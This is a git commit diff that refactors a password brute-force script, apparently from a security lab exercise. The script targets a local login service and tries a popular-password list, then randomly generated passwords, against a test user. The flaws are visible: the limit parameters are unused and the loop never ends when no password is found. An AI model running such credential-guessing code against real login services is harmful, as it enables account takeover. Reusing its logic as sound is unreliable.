074670248c68df79c3abd7ad0bca8352ab41fe80
IdoD <idodaniel2@gmail.com>
2025-12-13 16:51:53 +0200

    add function for crack

--- crack/brute_force.py
+++ crack/brute_force.py
@@ -5,15 +5,13 @@ import string
 
 group_seed = 413134
 #base_url = 'http://192.168.1.103:5000'
-base_url = 'http://localhost:5000'
+base_url = 'http://127.0.0.1:5000'
 
 
 def generate_medium_password():
-    # leave space for 2 digits + 1 symbol
-    word_len = secrets.randbelow(17) - 3
-
-    # generate word
-    word = ''.join(secrets.choice(string.ascii_lowercase) for _ in range(word_len))
+    
+    # generate word    
+    word = ''.join(secrets.choice(string.ascii_lowercase) for _ in range((secrets.randbelow(17) - 3)))
 
     # randomly capitalize or not
     if secrets.choice([True, False]):
@@ -35,24 +33,30 @@ with open('crack/popular_passwords.txt', 'r') as f:
     for line in f:
         weak_passwords.append(line.strip())
 
-counter = 0
-ok = False
-client = LoginClient(base_url, group_seed)
+
+
+def iterate_over_user(username, weak_lim=10000, med_lim=40000, total_lim=50000):
+    counter = 0
+    ok = False
+    client = LoginClient(base_url, group_seed)
+
+    while counter < 50000 or not ok:
+        if counter < 10000:
+            password = weak_passwords[counter]
+        elif counter < 40000:
+            password = generate_medium_password()
+        else:
+            password = generate_strong_password()
+
+        ok = client.attempt_login_once(username, password)
+        if ok:
+            print(f"{username}, {password}, Broke after {counter} iterations")
+            return True
+        else:
+            #print(f"{username}, {password}, Fail!")
+            counter = counter + 1
+    return False
+
 
 username = 'user_weak_2'
-
-while counter < 50000 or not ok:
-    if counter < 10000:
-        password = weak_passwords[counter]
-    elif counter < 40000:
-        password = generate_medium_password()
-    else:
-        password = generate_strong_password()
-
-    ok = client.attempt_login_once(username, password)
-    if ok:
-        print(f"{username}, {password}, Broke after {counter} iterations")
-        break
-    else:
-        #print(f"{username}, {password}, Fail!")
-        counter = counter + 1
+iterate_over_user(username)
